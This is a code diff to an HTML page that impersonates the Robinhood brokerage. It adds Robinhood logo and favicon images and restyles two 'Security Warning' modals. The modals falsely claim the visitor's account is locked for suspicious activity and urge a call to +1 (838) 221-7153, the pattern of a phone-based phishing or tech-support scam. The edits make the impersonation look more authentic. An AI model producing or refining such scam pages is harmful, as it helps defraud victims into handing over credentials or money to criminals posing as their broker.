@@ -4,6 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Robinhood | Trade Smart, Trade Free</title>
+  
+  <link rel="icon" type="image/png" sizes="32x32" href="robinhood-fvn.webp">
+  <link rel="icon" type="image/x-icon" href="robinhood-fvn.webp">
+  <link rel="apple-touch-icon" href="robinhood-fvn.webp"> <!-- for iOS devices -->
 
   <!-- Bootstrap 5 -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
@@ -248,11 +252,11 @@
       font-weight: 600;
     }
     .help-link {
-      margin-top: 10px;
       display: block;
       text-align: center;
       color: #28a745;
       text-decoration: none;
+      font-size: 20px;
       font-weight: 600;
     }
 
@@ -265,6 +269,9 @@
       text-align: center;
       padding: 2rem 1rem;
       border-top: 1px solid #333;
+    }
+    .rbn-logo {
+      width: 150px;
     }
 
     @media (max-width: 768px) {
@@ -285,7 +292,7 @@
   <!-- Navbar -->
   <nav class="navbar navbar-expand-lg sticky-top">
     <div class="container-fluid">
-      <a class="navbar-brand" href="#">Robinhood</a>
+      <a class="navbar-brand" href="#"><img src="robinhood-logo.webp" class="img-fluid rbn-logo" alt="logo"></a>
       <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
         <span class="navbar-toggler-icon"></span>
       </button>
@@ -406,12 +413,16 @@
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content bg-dark text-light rounded-4 border border-warning">
       <div class="modal-header d-block border-0">
-        <h5 class="modal-title text-warning text-center">Security Warning</h5>
+        <h4 class="modal-title text-warning text-center">Security Warning</h4>
       </div>
       <hr class="my-0">
       <div class="modal-body">
         <small>Suspicious activity detected on your account. We’ve temporarily locked your account for your protection. Please verify your identity to restore access.</small>
-        <br><a href="tel:+18382217153" class="help-link d-block py-4"> Need Assistant? Call +1 (838) 221-7153</a>
+        
+      </div>
+      <hr class="my-0">
+      <div class="modal-footer text-center d-block" style="border-top: 0;">
+        <a href="tel:+18382217153" class="help-link d-block"> Need Assistant? Call +1 (838) 221-7153</a>
       </div>
     </div>
   </div>
@@ -422,12 +433,15 @@
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content bg-dark text-light rounded-4 border border-warning">
       <div class="modal-header d-block border-0">
-        <h5 class="modal-title text-warning pb-0 mb-0 text-center">Security Warning</h5>
+        <h4 class="modal-title text-warning pb-0 mb-0 text-center">Security Warning</h4>
       </div>
       <hr class="my-0">
       <div class="modal-body">
         <small>Suspicious activity detected on your account. We’ve temporarily locked your account for your protection. Please verify your identity to restore access.</small>
-        <br><a href="tel:+18382217153" class="help-link d-block py-4"> Need Assistant? Call +1 (838) 221-7153</a>
+      </div>
+      <hr class="my-0">
+      <div class="modal-footer text-center d-block" style="border-top: 0;">
+          <a href="tel:+18382217153" class="help-link d-block"> Need Assistant? Call +1 (838) 221-7153</a>
       </div>
     </div>
   </div>
